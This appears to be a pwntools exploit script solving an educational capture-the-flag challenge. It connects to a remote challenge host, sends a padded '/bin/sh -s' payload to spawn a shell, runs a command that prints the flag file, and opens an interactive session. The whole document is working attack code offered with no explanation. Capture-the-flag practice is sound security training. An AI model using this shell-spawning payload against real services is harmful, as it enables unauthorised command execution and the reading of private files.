from pwn import *

#r = process('./chal')
r = remote('edu-ctf.zoolab.org','10123')

r.sendline(b'/bin/sh -s ' + b' '*0x100)
r.sendline(b'cat /home/chal/flag 1>&0')
r.interactive()
